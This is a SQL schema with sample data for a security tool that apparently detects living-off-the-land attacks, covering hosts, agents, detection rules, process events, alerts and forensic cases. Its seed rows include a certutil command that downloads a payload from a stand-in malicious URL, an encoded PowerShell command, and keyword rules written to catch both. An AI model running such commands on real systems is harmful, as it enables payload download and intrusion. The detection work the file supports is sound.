-- Database Creation
CREATE DATABASE IF NOT EXISTS lotl_dfms;
USE lotl_dfms;

-- 1) lotl_role
CREATE TABLE lotl_role (
    role_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    role_name VARCHAR(30) UNIQUE NOT NULL,
    description VARCHAR(255) NULL
) ENGINE=InnoDB;

-- 2) lotl_login
CREATE TABLE lotl_login (
    login_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    role_id BIGINT UNSIGNED NOT NULL,
    full_name VARCHAR(120) NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    phone VARCHAR(30) NULL,
    password_hash VARCHAR(255) NOT NULL,
    status VARCHAR(10) NOT NULL CHECK (status IN ('active', 'inactive')),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_login DATETIME NULL,
    FOREIGN KEY (role_id) REFERENCES lotl_role(role_id)
) ENGINE=InnoDB;

-- 3) lotl_host
CREATE TABLE lotl_host (
    host_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    asset_name VARCHAR(120) NULL,
    hostname VARCHAR(120) UNIQUE NOT NULL,
    ip_address VARCHAR(45) NULL,
    os_name VARCHAR(80) NULL,
    os_version VARCHAR(80) NULL,
    environment VARCHAR(10) NOT NULL CHECK (environment IN ('lab', 'prod')),
    criticality VARCHAR(10) NOT NULL CHECK (criticality IN ('low', 'medium', 'high')),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_seen DATETIME NULL,
    status VARCHAR(15) NOT NULL CHECK (status IN ('active', 'inactive', 'isolated'))
) ENGINE=InnoDB;

-- 4) lotl_agent
CREATE TABLE lotl_agent (
    agent_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    host_id BIGINT UNSIGNED NOT NULL,
    agent_uuid CHAR(36) UNIQUE NOT NULL,
    agent_name VARCHAR(80) NOT NULL,
    agent_version VARCHAR(40) NULL,
    status VARCHAR(15) NOT NULL CHECK (status IN ('active', 'inactive')),
    last_seen DATETIME NULL,
    install_time DATETIME NULL,
    FOREIGN KEY (host_id) REFERENCES lotl_host(host_id) ON DELETE CASCADE
) ENGINE=InnoDB;

-- 5) lotl_user_host (Junction)
CREATE TABLE lotl_user_host (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT UNSIGNED NOT NULL,
    host_id BIGINT UNSIGNED NOT NULL,
    access_level VARCHAR(10) NOT NULL CHECK (access_level IN ('owner', 'editor', 'viewer')),
    UNIQUE KEY unique_user_host (user_id, host_id),
    FOREIGN KEY (user_id) REFERENCES lotl_login(login_id) ON DELETE CASCADE,
    FOREIGN KEY (host_id) REFERENCES lotl_host(host_id) ON DELETE CASCADE
) ENGINE=InnoDB;

-- 6) lotl_detection_rule
CREATE TABLE lotl_detection_rule (
    rule_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    rule_name VARCHAR(160) UNIQUE NOT NULL,
    description TEXT NULL,
    technique VARCHAR(120) NULL,
    severity_default VARCHAR(10) NOT NULL CHECK (severity_default IN ('low', 'medium', 'high', 'critical')),
    enabled BOOLEAN NOT NULL DEFAULT TRUE,
    logic_type VARCHAR(10) NOT NULL CHECK (logic_type IN ('regex', 'keyword', 'sigma')),
    rule_content LONGTEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME NULL
) ENGINE=InnoDB;

-- 7) lotl_process_event
CREATE TABLE lotl_process_event (
    event_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    host_id BIGINT UNSIGNED NOT NULL,
    agent_id BIGINT UNSIGNED NULL,
    provider VARCHAR(20) NOT NULL CHECK (provider IN ('Sysmon', 'Security', 'PowerShell')),
    event_type VARCHAR(40) NOT NULL,
    timestamp DATETIME NOT NULL,
    user_name VARCHAR(120) NULL,
    image_path TEXT NULL,
    process_name VARCHAR(260) NULL,
    command_line TEXT NULL,
    current_directory TEXT NULL,
    pid INT NULL,
    ppid INT NULL,
    parent_image TEXT NULL,
    parent_command_line TEXT NULL,
    hash_sha256 CHAR(64) NULL,
    raw_event JSON NULL,
    FOREIGN KEY (host_id) REFERENCES lotl_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (agent_id) REFERENCES lotl_agent(agent_id) ON DELETE SET NULL
) ENGINE=InnoDB;

-- 8) lotl_alert_reference
CREATE TABLE lotl_alert_reference (
    alert_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    host_id BIGINT UNSIGNED NOT NULL,
    agent_id BIGINT UNSIGNED NULL,
    event_ref_id BIGINT UNSIGNED NULL,
    rule_id BIGINT UNSIGNED NOT NULL,
    severity VARCHAR(10) NOT NULL CHECK (severity IN ('low', 'medium', 'high', 'critical')),
    description TEXT NULL,
    timestamp DATETIME NOT NULL,
    status VARCHAR(12) NOT NULL CHECK (status IN ('new', 'open', 'suppressed', 'closed')),
    confidence_score DECIMAL(5,2) NULL CHECK (confidence_score >= 0 AND confidence_score <= 100),
    detection_source VARCHAR(10) NOT NULL CHECK (detection_source IN ('rule', 'ml', 'hybrid')),
    FOREIGN KEY (host_id) REFERENCES lotl_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (agent_id) REFERENCES lotl_agent(agent_id) ON DELETE SET NULL,
    FOREIGN KEY (event_ref_id) REFERENCES lotl_process_event(event_id) ON DELETE SET NULL,
    FOREIGN KEY (rule_id) REFERENCES lotl_detection_rule(rule_id)
) ENGINE=InnoDB;

-- 9) lotl_case
CREATE TABLE lotl_case (
    case_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(200) NOT NULL,
    description TEXT NULL,
    priority VARCHAR(10) NOT NULL CHECK (priority IN ('low', 'medium', 'high', 'critical')),
    status VARCHAR(12) NOT NULL CHECK (status IN ('open', 'in_progress', 'closed')),
    created_by BIGINT UNSIGNED NOT NULL,
    assigned_to BIGINT UNSIGNED NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    closed_at DATETIME NULL,
    FOREIGN KEY (created_by) REFERENCES lotl_login(login_id),
    FOREIGN KEY (assigned_to) REFERENCES lotl_login(login_id) ON DELETE SET NULL
) ENGINE=InnoDB;

-- 10) lotl_case_alerts (Junction)
CREATE TABLE lotl_case_alerts (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    case_id BIGINT UNSIGNED NOT NULL,
    alert_id BIGINT UNSIGNED NOT NULL,
    added_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY unique_case_alert (case_id, alert_id),
    FOREIGN KEY (case_id) REFERENCES lotl_case(case_id) ON DELETE CASCADE,
    FOREIGN KEY (alert_id) REFERENCES lotl_alert_reference(alert_id) ON DELETE CASCADE
) ENGINE=InnoDB;

-- 11) lotl_acknowledgement
CREATE TABLE lotl_acknowledgement (
    ack_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    alert_id BIGINT UNSIGNED NOT NULL,
    user_id BIGINT UNSIGNED NOT NULL,
    ack_status VARCHAR(15) NOT NULL CHECK (ack_status IN ('acknowledged', 'ignored', 'false_positive')),
    note TEXT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY unique_alert_ack (alert_id, user_id),
    FOREIGN KEY (alert_id) REFERENCES lotl_alert_reference(alert_id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES lotl_login(login_id) ON DELETE CASCADE
) ENGINE=InnoDB;

-- 12) lotl_forensic_artifact
CREATE TABLE lotl_forensic_artifact (
    artifact_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    case_id BIGINT UNSIGNED NULL,
    alert_id BIGINT UNSIGNED NULL,
    host_id BIGINT UNSIGNED NOT NULL,
    artifact_type VARCHAR(60) NOT NULL,
    file_path TEXT NOT NULL,
    hash_sha256 CHAR(64) NULL,
    collected_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    collected_by BIGINT UNSIGNED NULL,
    notes TEXT NULL,
    FOREIGN KEY (case_id) REFERENCES lotl_case(case_id) ON DELETE SET NULL,
    FOREIGN KEY (alert_id) REFERENCES lotl_alert_reference(alert_id) ON DELETE SET NULL,
    FOREIGN KEY (host_id) REFERENCES lotl_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (collected_by) REFERENCES lotl_login(login_id) ON DELETE SET NULL
) ENGINE=InnoDB;

-- 13) lotl_report
CREATE TABLE lotl_report (
    report_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    generated_by BIGINT UNSIGNED NOT NULL,
    report_type VARCHAR(20) NOT NULL CHECK (report_type IN ('daily', 'weekly', 'case_report', 'alert_summary')),
    period_start DATE NULL,
    period_end DATE NULL,
    file_path TEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (generated_by) REFERENCES lotl_login(login_id)
) ENGINE=InnoDB;

-- 14) lotl_audit_log
CREATE TABLE lotl_audit_log (
    audit_id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT UNSIGNED NULL,
    action_type VARCHAR(40) NOT NULL,
    object_type VARCHAR(40) NULL,
    object_id BIGINT UNSIGNED NULL,
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45) NULL,
    details JSON NULL,
    FOREIGN KEY (user_id) REFERENCES lotl_login(login_id) ON DELETE SET NULL
) ENGINE=InnoDB;


-- Indexes
CREATE INDEX idx_process_host_time ON lotl_process_event(host_id, timestamp);
CREATE INDEX idx_alert_status_time ON lotl_alert_reference(status, timestamp);
CREATE INDEX idx_case_status_created ON lotl_case(status, created_at);
CREATE INDEX idx_case_alerts_case ON lotl_case_alerts(case_id);
CREATE INDEX idx_case_alerts_alert ON lotl_case_alerts(alert_id);


-- Sample Data

-- 1. Roles
INSERT INTO lotl_role (role_name, description) VALUES 
('Admin', 'Full system access'),
('Analyst', 'Can manage cases and alerts'),
('Viewer', 'Read-only access to dashboards');

-- 2. Logins
INSERT INTO lotl_login (role_id, full_name, email, phone, password_hash, status) VALUES 
(1, 'Admin User', 'admin@securepulse.local', '555-0101', '$2b$10$EpWah9yBl1h5wLk.dyNo..d.2', 'active'),
(2, 'Analyst User', 'analyst@securepulse.local', '555-0102', '$2b$10$EpWah9yBl1h5wLk.dyNo..d.2', 'active'),
(3, 'View User', 'viewer@securepulse.local', '555-0103', '$2b$10$EpWah9yBl1h5wLk.dyNo..d.2', 'active');

-- 3. Hosts
INSERT INTO lotl_host (asset_name, hostname, ip_address, os_name, os_version, environment, criticality, status) VALUES 
('Finance Server', 'FIN-SRV-01', '192.168.1.10', 'Windows Server 2019', '1809', 'prod', 'high', 'active'),
('Dev Workstation', 'DEV-WKST-04', '192.168.1.55', 'Windows 10', '21H2', 'lab', 'low', 'active');

-- 4. Agents
INSERT INTO lotl_agent (host_id, agent_uuid, agent_name, agent_version, status, last_seen, install_time) VALUES 
(1, '550e8400-e29b-41d4-a716-446655440000', 'SentinelAgent-Win', '1.2.0', 'active', NOW(), NOW()),
(2, '550e8400-e29b-41d4-a716-446655440001', 'SentinelAgent-Win', '1.2.0', 'active', NOW(), NOW());

-- 5. User-Host Access
INSERT INTO lotl_user_host (user_id, host_id, access_level) VALUES 
(2, 1, 'editor'),
(3, 2, 'viewer');

-- 6. Detection Rules
INSERT INTO lotl_detection_rule (rule_name, description, technique, severity_default, logic_type, rule_content) VALUES 
('CertUtil Download', 'Detects use of certutil.exe to download files', 'T1105', 'high', 'keyword', 'process_name:certutil.exe AND command_line:urlcache'),
('Suspicious PowerShell', 'Detects encoded capabilities in PowerShell', 'T1059.001', 'medium', 'keyword', 'process_name:powershell.exe AND command_line:-enc');

-- 7. Process Events
INSERT INTO lotl_process_event (host_id, agent_id, provider, event_type, timestamp, user_name, process_name, command_line) VALUES 
(1, 1, 'Sysmon', 'ProcessCreate', NOW(), 'SYSTEM', 'C:\\Windows\\System32\\certutil.exe', 'certutil.exe -urlcache -split http://malware.com/payload.exe'),
(2, 2, 'Sysmon', 'ProcessCreate', NOW(), 'User1', 'C:\\Windows\\System32\\powershell.exe', 'powershell.exe -enc ZWNobyBoYWNrZWQ=');

-- 8. Alerts
INSERT INTO lotl_alert_reference (host_id, agent_id, event_ref_id, rule_id, severity, description, timestamp, status, confidence_score, detection_source) VALUES 
(1, 1, 1, 1, 'high', 'CertUtil Abuse Detected', NOW(), 'new', 95.00, 'rule'),
(2, 2, 2, 2, 'medium', 'Encoded PowerShell Detected', NOW(), 'new', 80.00, 'rule');

-- 9. Cases
INSERT INTO lotl_case (title, description, priority, status, created_by, assigned_to) VALUES 
('Suspicious Download on FIN-SRV-01', 'Investigation into certutil misuse.', 'high', 'open', 2, 2);

-- 10. Case Alerts
INSERT INTO lotl_case_alerts (case_id, alert_id) VALUES 
(1, 1);

-- 11. Acknowledgements
INSERT INTO lotl_acknowledgement (alert_id, user_id, ack_status, note) VALUES 
(1, 2, 'acknowledged', 'Investigating payload URL now.');

-- 12. Forensic Artifacts
INSERT INTO lotl_forensic_artifact (case_id, alert_id, host_id, artifact_type, file_path, collected_by, notes) VALUES 
(1, 1, 1, 'File Sample', 'C:\\Users\\Public\\payload.exe', 2, 'Quarantined sample for malware analysis.');

-- 13. Reports
INSERT INTO lotl_report (generated_by, report_type, file_path) VALUES 
(2, 'case_report', '/reports/case_1_summary.pdf');

-- 14. Audit Log
INSERT INTO lotl_audit_log (user_id, action_type, object_type, object_id, details) VALUES 
(2, 'CREATE_CASE', 'CASE', 1, '{"title": "Suspicious Download on FIN-SRV-01"}'),
(1, 'USER_LOGIN', 'USER', 1, '{"status": "success"}');
